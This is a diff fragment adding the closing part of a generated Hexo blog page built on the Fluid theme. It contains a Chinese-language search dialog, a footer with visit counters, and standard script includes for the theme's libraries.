+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/scrollAnimation.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
